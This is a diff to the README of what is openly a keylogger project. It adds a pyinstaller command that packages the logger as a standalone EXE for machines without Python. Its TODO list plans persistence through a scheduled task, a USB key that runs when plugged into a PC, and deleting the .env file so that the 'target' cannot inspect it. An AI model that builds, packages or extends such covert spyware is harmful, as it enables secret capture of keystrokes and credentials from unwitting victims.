@@ -41,7 +41,13 @@ Calls the run method to start the KeyLogger.
 The first action, based on the operating system, deletes the .env file. In this way, the target cannot see your sensitive data.
 Write the magic word (if set) to break the loop.
 
+### Single EXE file version
+
+If you need to run the code within a PC that has no Python installed, you can use the module pyinstaller (inserted in the reuirements file) as follows:
+- pyinstaller --onefile --add-data ".env;." main.py
+
 ### TODO
+
 - Add an optional parameter to copy the Python script somewhere and creates a scheduled task to execute it
 - Create a USB key that runs upon it's plugged in a PC
 - Improve the remove_env_file function to remove the .env file only when somebody tries to check the file content
